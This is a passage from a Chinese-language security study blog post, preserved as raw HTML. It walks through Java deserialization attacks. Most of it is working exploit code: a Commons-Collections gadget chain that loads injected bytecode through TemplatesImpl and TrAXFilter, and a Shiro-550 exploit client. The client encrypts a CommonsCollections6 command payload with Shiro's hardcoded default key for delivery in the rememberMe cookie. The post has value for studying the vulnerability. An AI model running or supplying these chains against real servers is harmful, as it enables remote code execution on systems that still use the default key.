&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// setFieldValue(obj, &amp;#34;_bytecodes&amp;#34;, new byte[][]{Base64.getDecoder().decode(&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;)});
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;xxxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cck1shiro-550">CCK1(Shiro-550)&lt;/h2>
&lt;p>p牛给出了一个&lt;a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">小demo&lt;/a>，只有两个jsp，依赖有这些&lt;/p>
&lt;ul>
&lt;li>shiro-core、shiro-web，这是shiro本身的依赖&lt;/li>
&lt;li>javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖&lt;/li>
&lt;li>slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖&lt;/li>
&lt;li>commons-logging，这是shiro中用到的一个接口，不添加会爆java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory错误&lt;/li>
&lt;li>commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖，版本为3.2.1&lt;/li>
&lt;/ul>
&lt;p>打war包后部署在本地&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301201435981.png" alt="image-20220301201435981">&lt;/p>
&lt;p>抓包可以看到，不勾选&lt;code>Remember Me&lt;/code>时cookie有rememberMe=deleteMe，勾选的话则是&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301202246982.png" alt="image-20220301202246982">&lt;/p>
&lt;p>这里的b64加密信息是AES，在&lt;code>org.apache.shiro.mgt.AbstractRememberMeManager&lt;/code>中可以看到默认key&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232709437.png" alt="image-20220301232709437">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301232313280.png" alt="image-20220301232313280">&lt;/p>
&lt;p>可以看到它在同名的构造函数中设置了这个default key，而控制cookie信息&lt;code>org.apache.shiro.web.mgt.CookieRememberMeManager&lt;/code>继承了这个类&lt;/p>
&lt;p>由于它使用了默认key并且用了cc依赖，我们的攻击过程是这样的：&lt;/p>
&lt;ul>
&lt;li>用CC链生成payload&lt;/li>
&lt;li>用Shiro默认key进行加密&lt;/li>
&lt;li>将密文作为rememberMe的Cookie发送给服务端&lt;/li>
&lt;/ul>
&lt;h3 id="cc6为什么不行">CC6为什么不行&lt;/h3>
&lt;p>p牛写了一个基于CC6的exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">com.govuln.shiroattack&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client0&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#f92672">[]&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payloads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CommonsCollections6&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
